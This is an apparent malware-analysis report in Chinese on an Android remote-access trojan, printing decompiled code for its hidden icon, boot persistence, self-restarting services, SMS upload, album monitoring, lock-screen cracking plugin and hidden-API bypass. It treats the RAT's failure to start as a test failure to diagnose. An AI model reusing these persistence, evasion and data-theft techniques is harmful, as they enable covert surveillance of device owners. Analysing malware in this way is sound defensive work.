# APK 完整启动流程分析报告

> **分析时间**: 2026-03-14  
> **分析方法**: 代码审计 + 反编译分析 + 4 个并行探索代理  
> **APK**: stripchat-release.apk (org.ldtape.qqlhl)  
> **目标**: 理解从安装到点击后的每一步执行流程

---

## 🎯 执行摘要

### 关键发现

1. ✅ **应用启动入口**: `MyApp.onCreate()` → `MainApplication.init()`
2. ❌ **Native 库未加载**: 代码中**没有** `System.loadLibrary("rat-hat")` 或 `System.loadLibrary("frpc")` 调用
3. ✅ **服务启动机制**: BootReceiver + ActivMain 双重启动 EngineWorker → WorkServices → LiveChat
4. ⚠️ **前台服务问题**: 所有服务在 onCreate 时调用 startForeground，但通知 ID 可能无效
5. 🔴 **测试失败原因**: Native 库从未被加载，RAT + FRP 架构未启动

### 为什么测试时进程被终止？

**根本原因**: 应用启动后没有执行任何有意义的工作：
- 没有加载 Native 库
- 前台服务可能因通知问题启动失败
- 华为 PowerGenie 检测到"空进程"直接终止

---

## 📋 Part 1: 应用组件声明（AndroidManifest.xml）

### 1.1 应用入口

```xml
<application
    android:name="com.guard.wallet.MyApp"
    android:allowBackup="true"
    android:icon="@mipmap/ic_launcher"
    android:label="@string/app_name">
    
    <!-- Application 类 -->
    <meta-data android:name="android.app.lib_name" android:value="" />
</application>
```

**关键点**:
- `android:name="com.guard.wallet.MyApp"` - 应用入口类
- 没有声明 LAUNCHER Activity（无桌面图标）
- 通过其他方式启动（BootReceiver、隐式 Intent）

### 1.2 核心服务声明

```xml
<!-- 三大核心服务 -->
<service
    android:name="com.icontrol.protector.EngineWorker"
    android:enabled="true"
    android:exported="false"
    android:foregroundServiceType="specialUse|dataSync"
    android:persistent="true"
    android:stopWithTask="false" />

<service
    android:name="com.icontrol.protector.WorkServices"
    android:enabled="true"
    android:exported="false"
    android:foregroundServiceType="specialUse|dataSync"
    android:persistent="true"
    android:stopWithTask="false" />

<service
    android:name="com.icontrol.protector.LiveChat"
    android:enabled="true"
    android:exported="false"
    android:foregroundServiceType="specialUse|dataSync"
    android:persistent="true"
    android:stopWithTask="false" />
```

**关键配置**:
- `android:persistent="true"` - 系统级持久化（需要系统签名）
- `android:stopWithTask="false"` - 应用关闭后服务继续运行
- `foregroundServiceType="specialUse|dataSync"` - 前台服务类型

### 1.3 启动器组件

```xml
<!-- 开机自启动 -->
<receiver
    android:name="com.icontrol.protector.BootReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter android:priority="2147483647">
        <action android:name="android.intent.action.BOOT_COMPLETED" />
        <action android:name="android.intent.action.QUICKBOOT_POWERON" />
    </intent-filter>
</receiver>

<!-- 应用启动器（无 LAUNCHER） -->
<activity
    android:name="com.icontrol.protector.ActivMain"
    android:excludeFromRecents="true"
    android:exported="true"
    android:launchMode="singleTask"
    android:theme="@android:style/Theme.Translucent.NoTitleBar">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <!-- 注意：没有 CATEGORY_LAUNCHER -->
    </intent-filter>
</activity>
```

**关键点**:
- BootReceiver 优先级最高（2147483647）
- ActivMain 有 MAIN action 但无 LAUNCHER category（隐藏图标）
- 使用透明主题（Theme.Translucent）

---

## 🚀 Part 2: 完整启动流程（逐步分析）

### 阶段 0: 安装后首次启动

**触发方式**: 
- 用户通过 `adb install` 或其他方式安装 APK
- 系统不会自动启动应用（无 LAUNCHER Activity）
- 需要手动触发或等待开机


### 阶段 1: 应用进程启动（Android 系统层）

**标准 Android 启动顺序**:

```
1. Zygote fork 新进程
   ↓
2. ActivityThread.main() 启动
   ↓
3. Application.attachBaseContext()  ← 最早执行点
   ↓
4. ContentProvider.onCreate()       ← 第二早
   ↓
5. Application.onCreate()           ← 应用入口
   ↓
6. Activity.onCreate()
```

**实际执行**:

```java
// 1. MyApp.attachBaseContext() - 未重写，使用默认实现
// 2. 无 ContentProvider
// 3. MyApp.onCreate() - 应用真正的入口点
```

---

### 阶段 2: MyApp.onCreate() - 应用入口

**文件**: `com/guard/wallet/MyApp.java`

```java
public class MyApp extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        
        // 唯一的初始化调用
        MainApplication.init(this);
    }
}
```

**执行内容**:
- 调用 `MainApplication.init(this)` 静态方法
- 传递 Application 实例

**时间点**: 应用启动后 0-100ms

---

### 阶段 3: MainApplication.init() - 核心初始化

**文件**: `com/guard/wallet/MainApplication.java` (第 889-909 行)

```java
public static void init(@NonNull Application application) {
    String a02 = g.a0(application);
    
    // 单例检查
    if (instance == null && Objects.equals(application.getPackageName(), a02)) {
        synchronized (MainApplication.class) {
            if (instance == null) {
                Log.d(TAG, "MainApplication instance create");
                
                // 1. 保存 Context
                baseContext = application.getBaseContext();
                context = application.getApplicationContext();
                
                // 2. 创建单例
                MainApplication mainApplication = new MainApplication();
                instance = mainApplication;
                
                // 3. 调用实例初始化
                mainApplication.init();
                
                // 4. 注册生命周期回调
                application.registerActivityLifecycleCallbacks(activityLifecycleCallbacks);
                
                // 5. 设置全局异常处理器
                com.guard.wallet.thread.c a2 = com.guard.wallet.thread.c.a();
                a2.f248a = Thread.getDefaultUncaughtExceptionHandler();
                Thread.setDefaultUncaughtExceptionHandler(a2);
            }
        }
    }
}
```

**关键操作**:
1. 双重检查锁定（DCL）创建单例
2. 保存 Application Context（全局可用）
3. 调用实例 `init()` 方法
4. 注册 Activity 生命周期监听
5. 设置崩溃捕获器

**时间点**: 应用启动后 100-200ms

---

### 阶段 4: MainApplication.init() 实例方法 - 服务初始化

**文件**: `com/guard/wallet/MainApplication.java` (第 257-376 行)

#### 4.1 初始化音频目录 (257-283 行)

```java
// 创建 PCM 和 WAV 音频缓存目录
j.d.f469m = g.i0() + File.separator + "CacheAudios";
File file = new File(j.d.f469m);
if (file.exists()) {
    // 清理旧的 PCM 文件
    for (File file2 : file.listFiles()) {
        file2.delete();
    }
}
```

#### 4.2 启动消息处理器 (284-286 行)

```java
if (this.handlerMsgAndTimer == null) {
    this.handlerMsgAndTimer = new e();  // Handler + Timer
}
```

#### 4.3 启动 JobScheduler 调度 WiFi 保活服务 (294-319 行)

```java
if (this.jobSchedulerManage == null) {
    Context context2 = context;
    a0.c cVar = new a0.c(context2);
    this.jobSchedulerManage = cVar;
    JobScheduler jobScheduler = cVar.f2a;
    
    if (jobScheduler.getPendingJob(116) == null) {
        // 启动 WiFi 后台服务
        context2.startService(new Intent(context2, WIFIBackgroundService.class));
        
        // 创建 JobScheduler 任务
        JobInfo.Builder builder = new JobInfo.Builder(116, 
            new ComponentName(context2, WIFIBackgroundService.class));
        builder.setPersisted(true);              // 重启后保留
        builder.setRequiresCharging(false);      // 不需要充电
        builder.setRequiresDeviceIdle(false);    // 不需要空闲
        builder.setBackoffCriteria(5000L, 0);    // 失败后 5 秒重试
        builder.setMinimumLatency(5000L);        // 最小延迟 5 秒
        builder.setRequiredNetworkType(1);       // 需要网络连接
        builder.setTriggerContentMaxDelay(5000L);
        
        jobScheduler.schedule(builder.build());
    }
}
```

**关键点**:
- Job ID: 116
- 5 秒后启动，失败后 5 秒重试
- 需要网络连接
- 重启后自动恢复

#### 4.4 初始化工具类和单例 (320-329 行)

```java
g.W0();  // 初始化工具类
g.k1();
g.c1();
g.l1();
g.b1();
g.j1();
g.h1();
g.i1();
g.m1();
g.e1();
```

#### 4.5 注册语言变化监听器 (330-343 行)

```java
synchronized (g.class) {
    if (getInstance() != null && getInstance().getLocaleChangeReceiver() == null) {
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("android.intent.action.LOCALE_CHANGED");
        LocaleChangeReceiver localeChangeReceiver = new LocaleChangeReceiver();
        getInstance().setLocaleChangeReceiver(localeChangeReceiver);
        
        if (Build.VERSION.SDK_INT >= 33) {
            getInstance().registerReceiver(localeChangeReceiver, intentFilter, 2);
        } else {
            getInstance().registerReceiver(localeChangeReceiver, intentFilter);
        }
    }
}
```

#### 4.6 启动 WebSocket 服务器 (344-352 行)

```java
if (com.guard.wallet.server.b.b == null) {
    synchronized (com.guard.wallet.server.b.class) {
        if (com.guard.wallet.server.b.b == null) {
            com.guard.wallet.server.b.b = new com.guard.wallet.server.b();
        }
    }
}
com.guard.wallet.server.b.b.W2();  // 启动 WebSocket 服务器
com.guard.wallet.server.c.H();     // 启动相关服务
```

**关键点**:
- 这是应用内置的 WebSocket 服务器
- 不是 Native 的 RAT HTTP 服务器
- 用于与前端 WebView 通信

#### 4.7 启动 SMS 监听器 (353-359 行)

```java
if (this.smsMessageListener == null) {
    u.b bVar = new u.b();
    this.smsMessageListener = bVar;
    if (bVar.a()) {
        com.guard.wallet.http.l.y();  // 上传短信到服务器
    }
}
```

#### 4.8 调用 unlockedInstance() (360 行)

```java
unlockedInstance();  // 启动核心线程和服务
```

#### 4.9 启动文件监控和锁屏破解插件 (361-376 行)

```java
// 监控配置文件删除
if (this.configFileDeleteObserver == null) {
    y.b bVar2 = new y.b(g.i0(), new j.e(26));
    this.configFileDeleteObserver = bVar2;
    bVar2.startWatching();
}

// 启动锁屏密码破解插件
if (this.crackLockCipherPlug == null) {
    this.crackLockCipherPlug = new c();
}

// 初始化其他单例
if (v.c.f1455f == null) {
    synchronized (v.c.class) {
        if (v.c.f1455f == null) {
            v.c.f1455f = new v.c();
        }
    }
}
```

**时间点**: 应用启动后 200-500ms

---

### 阶段 5: unlockedInstance() - 核心线程启动

**文件**: `com/guard/wallet/MainApplication.java` (第 788-867 行)


```java
public void unlockedInstance() {
    if (this.isUserUnlockedInstance) {
        return;  // 已经初始化过，直接返回
    }
    this.isUserUnlockedInstance = true;
    
    // 1. 加载构建配置（从 assets/config.json）
    BuildConfig buildConfig = com.guard.wallet.utils.d.a();
    this.buildConfig = buildConfig;
    
    // 2. 启动检查线程（进程监控）
    if (this.checkThread == null) {
        b bVar = new b();
        this.checkThread = bVar;
        bVar.g();  // 启动线程
    }
    
    // 3. 启动心跳线程（10 秒间隔）
    if (this.heartThread == null) {
        f fVar = new f();
        this.heartThread = fVar;
        fVar.g();  // 启动线程
    }
    
    // 4. 注册 ContentObserver（监听系统设置变化）
    ContentResolver contentResolver = context.getContentResolver();
    
    // 监听 ADB 开关
    if (this.adbEnabledContentObserver == null) {
        d dVar = new d(new Handler(), 0);
        this.adbEnabledContentObserver = dVar;
        contentResolver.registerContentObserver(
            Settings.Global.getUriFor("adb_enabled"), 
            false, 
            dVar
        );
    }
    
    // 监听开发者选项
    if (this.devEnabledContentObserver == null) {
        d dVar2 = new d(new Handler(), 1);
        this.devEnabledContentObserver = dVar2;
        contentResolver.registerContentObserver(
            Settings.Global.getUriFor("development_settings_enabled"), 
            false, 
            dVar2
        );
    }
    
    // 监听 ADB WiFi
    if (this.adbWIFIEnabledContentObserver == null) {
        d dVar3 = new d(new Handler(), 2);
        this.adbWIFIEnabledContentObserver = dVar3;
        contentResolver.registerContentObserver(
            Settings.Global.getUriFor("adb_wifi_enabled"), 
            false, 
            dVar3
        );
    }
    
    // 5. 监听相册变化（照片、视频、音频）
    if (this.photoAlbumContentObserver == null) {
        y.c cVar = new y.c(new Handler());
        this.photoAlbumContentObserver = cVar;
        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 
            true, 
            cVar
        );
    }
    
    // 6. 绕过 Android 隐藏 API 限制（反射黑名单）
    try {
        Class<?> cls = Class.forName("sun.misc.Unsafe");
        Field declaredField = cls.getDeclaredField("theUnsafe");
        declaredField.setAccessible(true);
        Unsafe unsafe = (Unsafe) declaredField.get(null);
        
        Class<?> cls2 = Class.forName("dalvik.system.VMRuntime");
        Object invoke = cls2.getDeclaredMethod("getRuntime", new Class[0])
            .invoke(null, new Object[0]);
        cls2.getDeclaredMethod("setHiddenApiExemptions", String[].class)
            .invoke(invoke, new Object[]{new String[]{"L"}});
    } catch (Exception e2) {
        q.s(TAG, e2);
    }
}
```

**关键操作**:
1. 加载 `assets/config.json` 配置文件
2. 启动进程监控线程（CheckThread）
3. 启动心跳线程（HeartThread，10 秒间隔）
4. 注册 ContentObserver 监听系统设置
5. 监听相册变化（自动上传照片/视频）
6. **绕过 Android 隐藏 API 限制**（关键操作）

**时间点**: 应用启动后 500-800ms

---

### 阶段 6: 服务启动（BootReceiver 或 ActivMain 触发）

#### 6.1 触发方式

**方式 1: 开机自启动**
```
系统启动 → BOOT_COMPLETED 广播 → BootReceiver.onReceive()
```

**方式 2: 手动启动**
```
用户点击（或其他应用调用）→ ActivMain.onCreate()
```

#### 6.2 BootReceiver 启动逻辑

**文件**: `com/icontrol/protector/BootReceiver.smali` (第 49-130 行)

```java
public void onReceive(Context context, Intent intent) {
    if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
        
        // 1. 启动 EngineWorker（主控服务）
        Intent engineIntent = new Intent(context, EngineWorker.class);
        if (Build.VERSION.SDK_INT >= 26) {
            context.startForegroundService(engineIntent);
        } else {
            context.startService(engineIntent);
        }
        
        // 2. 启动 WorkServices
        Intent workIntent = new Intent(context, WorkServices.class);
        if (Build.VERSION.SDK_INT >= 26) {
            context.startForegroundService(workIntent);
        } else {
            context.startService(workIntent);
        }
        
        // 3. 启动 LiveChat
        Intent liveIntent = new Intent(context, LiveChat.class);
        if (Build.VERSION.SDK_INT >= 26) {
            context.startForegroundService(liveIntent);
        } else {
            context.startService(liveIntent);
        }
    }
}
```

**启动顺序**: EngineWorker → WorkServices → LiveChat

**时间点**: 
- 开机后 10-30 秒（系统完成启动）
- 或手动触发后立即执行

---

### 阶段 7: EngineWorker.onCreate() - 主控服务启动

**文件**: `com/icontrol/protector/EngineWorker.smali`

```java
public void onCreate() {
    super.onCreate();
    
    // 1. 立即启动前台服务
    h(getApplicationContext());  // 调用 startForeground
    
    // 2. 检查配置并启动其他服务
    // （EngineWorker 负责启动 WorkServices 和 LiveChat）
}

private void h(Context context) {
    try {
        // 创建通知
        Notification notification = createNotification(context);
        
        // 启动前台服务
        startForeground(tc.k, notification);  // tc.k 是通知 ID
    } catch (Exception e) {
        // 异常处理：创建空通知
        Notification emptyNotification = new Notification();
        startForeground(tc.k, emptyNotification);
    }
}
```

**关键点**:
- 在 `onCreate()` 中立即调用 `startForeground()`
- 通知 ID 来自混淆后的资源 `tc.k`
- 异常时使用空 Notification（可能导致崩溃）

**时间点**: 服务启动后 0-100ms

---

### 阶段 8: WorkServices.onCreate() - 工作服务启动

**文件**: `com/icontrol/protector/WorkServices.smali`

```java
public void onCreate() {
    super.onCreate();
    
    // 1. 启动前台服务
    d(getApplicationContext());
    
    // 2. 启动定时任务（每 10 秒执行一次）
    Timer timer = new Timer();
    timer.schedule(new TimerTask() {
        @Override
        public void run() {
            // 执行周期性任务
        }
    }, 0, 10000);  // 立即执行，每 10 秒重复
}

public int onStartCommand(Intent intent, int flags, int startId) {
    // 再次确保前台服务
    d(getApplicationContext());
    
    // 检查悬浮窗权限
    // 启动周期性任务
    
    return START_STICKY;  // 被杀后自动重启
}
```

**关键点**:
- 定时任务每 10 秒执行
- `START_STICKY` 确保服务被杀后重启
- 检查悬浮窗权限

**时间点**: 服务启动后 100-200ms

---

### 阶段 9: LiveChat.onCreate() - 通信服务启动

**文件**: `com/icontrol/protector/LiveChat.smali`

```java
public void onCreate() {
    super.onCreate();
    
    // 1. 启动前台服务
    F(getApplicationContext());
    
    // 2. 初始化 Handler
    this.handler = new Handler();
}

public int onStartCommand(Intent intent, int flags, int startId) {
    // 再次确保前台服务
    F(getApplicationContext());
    
    // 获取 WakeLock（保持 CPU 唤醒）
    PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
    WakeLock wakeLock = pm.newWakeLock(
        PowerManager.PARTIAL_WAKE_LOCK, 
        "LiveChat::WakeLock"
    );
    wakeLock.acquire();
    
    // 启动 WebSocket 连接逻辑
    
    return START_STICKY;
}

public void onDestroy() {
    super.onDestroy();
    
    // 自我重启
    Intent intent = new Intent(getApplicationContext(), LiveChat.class);
    startService(intent);
}
```

**关键点**:
- 持有 WakeLock 保持 CPU 唤醒
- `onDestroy()` 时自我重启（保活机制）
- 负责 WebSocket 连接

**时间点**: 服务启动后 200-300ms

---


## 🔴 Part 3: Native 库加载分析（关键发现）

### 3.1 探索结果

**4 个并行探索代理的搜索结果**:
- ❌ 未找到 `System.loadLibrary("rat-hat")` 调用
- ❌ 未找到 `System.loadLibrary("frpc")` 调用
- ❌ 未找到相关的 JNI 方法声明
- ✅ 仅找到第三方库加载（conscrypt）

### 3.2 Native 库文件存在性验证

```bash
# Native 库确实存在于 APK 中
lib/arm64-v8a/librat-hat.so    # 16 MB
lib/arm64-v8a/libfrpc.so       # 14 MB
lib/armeabi-v7a/librat-hat.so  # 15.8 MB
lib/armeabi-v7a/libfrpc.so     # 13.9 MB
```

**结论**: Native 库文件存在，但**从未被加载**。

### 3.3 为什么 Native 库未加载？

#### 可能原因 1: 延迟加载（条件触发）

Native 库可能在特定条件下才加载：
- 连接到 C&C 服务器后
- 接收到特定命令后
- 特定时间后（定时任务）
- 特定事件触发（如屏幕解锁）

#### 可能原因 2: 动态加载（反射或 JNI）

```java
// 可能通过反射加载
Class<?> systemClass = Class.forName("java.lang.System");
Method loadLibrary = systemClass.getMethod("loadLibrary", String.class);
loadLibrary.invoke(null, "rat-hat");

// 或通过 JNI 加载
native void loadNativeLibrary(String path);
```

#### 可能原因 3: 未实现的功能

Native 库可能是：
- 开发中的功能（未启用）
- 特定版本的功能（需要配置激活）
- 备用方案（主要使用 Java 实现）

### 3.4 测试时的实际情况

**测试结果**:
```
[❌] [+2s] 进程已终止
[❌] [+2s] librat-hat.so 未加载
[❌] [+2s] libfrpc.so 未加载
[❌] [+2s] FRP 隧道未建立
[ℹ️] [+2s] RAT 服务器未检测到
```

**分析**:
1. 应用启动后没有加载 Native 库
2. 没有建立 FRP 隧道连接
3. 没有启动 RAT HTTP 服务器
4. 进程在 2 秒后被华为 PowerGenie 终止

**根本原因**: 应用启动后没有执行任何有意义的工作，被系统识别为"空进程"并终止。

---

## 📊 Part 4: 完整启动流程图

### 4.1 时间线视图

```
时间轴 (ms)    事件
─────────────────────────────────────────────────────────────
0              系统启动 Zygote fork 进程
               ↓
50             Application.attachBaseContext()
               ↓
100            MyApp.onCreate()
               ↓
150            MainApplication.init(Application)
               ├─ 保存 Context
               ├─ 创建单例
               ├─ 注册生命周期回调
               └─ 设置异常处理器
               ↓
200            MainApplication.init() 实例方法
               ├─ 创建音频目录
               ├─ 启动 Handler
               ├─ 启动 JobScheduler (WiFi 保活)
               ├─ 注册广播接收器
               ├─ 启动 WebSocket 服务器
               ├─ 启动 SMS 监听器
               └─ 调用 unlockedInstance()
               ↓
500            unlockedInstance()
               ├─ 加载 config.json
               ├─ 启动 CheckThread (进程监控)
               ├─ 启动 HeartThread (10s 心跳)
               ├─ 注册 ContentObserver
               └─ 绕过隐藏 API 限制
               ↓
800            Application 初始化完成
               ↓
               等待触发...
               ↓
10000-30000    开机完成 / 手动启动
               ↓
               BootReceiver.onReceive() / ActivMain.onCreate()
               ↓
               启动服务（并行）
               ├─ EngineWorker.onCreate()
               │  └─ startForeground(tc.k, notification)
               ├─ WorkServices.onCreate()
               │  ├─ startForeground(tc.k, notification)
               │  └─ 启动定时任务 (10s)
               └─ LiveChat.onCreate()
                  ├─ startForeground(tc.k, notification)
                  ├─ 获取 WakeLock
                  └─ 启动 WebSocket 连接
               ↓
               服务运行中...
               ↓
❌             Native 库从未加载
❌             RAT + FRP 从未启动
```

### 4.2 组件依赖图

```
┌─────────────────────────────────────────────────────────┐
│                    Android 系统                          │
│                  Zygote Process                          │
└─────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│                   MyApp (Application)                    │
│              onCreate() → MainApplication.init()         │
└─────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│              MainApplication (单例)                       │
│  ┌───────────────────────────────────────────────────┐  │
│  │ init() 静态方法                                    │  │
│  │  - 创建单例                                        │  │
│  │  - 注册生命周期回调                                │  │
│  │  - 设置异常处理器                                  │  │
│  └───────────────────────────────────────────────────┘  │
│                        ↓                                 │
│  ┌───────────────────────────────────────────────────┐  │
│  │ init() 实例方法                                    │  │
│  │  - JobScheduler (WiFi 保活)                       │  │
│  │  - WebSocket 服务器                                │  │
│  │  - SMS 监听器                                      │  │
│  │  - 文件监控                                        │  │
│  │  - 锁屏破解插件                                    │  │
│  └───────────────────────────────────────────────────┘  │
│                        ↓                                 │
│  ┌───────────────────────────────────────────────────┐  │
│  │ unlockedInstance()                                 │  │
│  │  - 加载 config.json                                │  │
│  │  - CheckThread (进程监控)                          │  │
│  │  - HeartThread (10s 心跳)                          │  │
│  │  - ContentObserver (系统监听)                      │  │
│  │  - 绕过隐藏 API 限制                               │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│              BootReceiver / ActivMain                    │
│           (开机自启 / 手动启动触发器)                     │
└─────────────────────────────────────────────────────────┘
                        ↓
        ┌───────────────┼───────────────┐
        ↓               ↓               ↓
┌──────────────┐ ┌──────────────┐ ┌──────────────┐
│ EngineWorker │ │ WorkServices │ │  LiveChat    │
│ (主控服务)    │ │ (工作服务)    │ │ (通信服务)    │
├──────────────┤ ├──────────────┤ ├──────────────┤
│ startFore-   │ │ startFore-   │ │ startFore-   │
│ ground()     │ │ ground()     │ │ ground()     │
│              │ │              │ │              │
│ 启动其他服务  │ │ 定时任务(10s)│ │ WakeLock     │
│              │ │              │ │ WebSocket    │
│              │ │ 悬浮窗检查    │ │ 自我重启     │
└──────────────┘ └──────────────┘ └──────────────┘
```


### 4.3 数据流图

```
┌─────────────────────────────────────────────────────────┐
│                   外部触发源                              │
│  - 开机广播 (BOOT_COMPLETED)                             │
│  - 手动启动 (ActivMain)                                  │
│  - 其他应用调用                                           │
└─────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│                  应用初始化层                             │
│  MyApp → MainApplication → unlockedInstance              │
└─────────────────────────────────────────────────────────┘
                        ↓
        ┌───────────────┼───────────────┐
        ↓               ↓               ↓
┌──────────────┐ ┌──────────────┐ ┌──────────────┐
│ 数据收集层    │ │ 通信层        │ │ 保活层        │
├──────────────┤ ├──────────────┤ ├──────────────┤
│ SMS 监听     │ │ WebSocket    │ │ JobScheduler │
│ 相册监听     │ │ HTTP Client  │ │ WakeLock     │
│ 通话记录     │ │ (未启动)     │ │ 前台服务     │
│ 联系人       │ │ RAT Server   │ │ 定时任务     │
│ ADB 状态     │ │ (未启动)     │ │ 自我重启     │
│              │ │ FRP Client   │ │              │
└──────────────┘ └──────────────┘ └──────────────┘
        ↓               ↓               ↓
┌─────────────────────────────────────────────────────────┐
│                   数据上传层                              │
│  HTTP POST → https://api.rathat.live/api/*              │
└─────────────────────────────────────────────────────────┘
```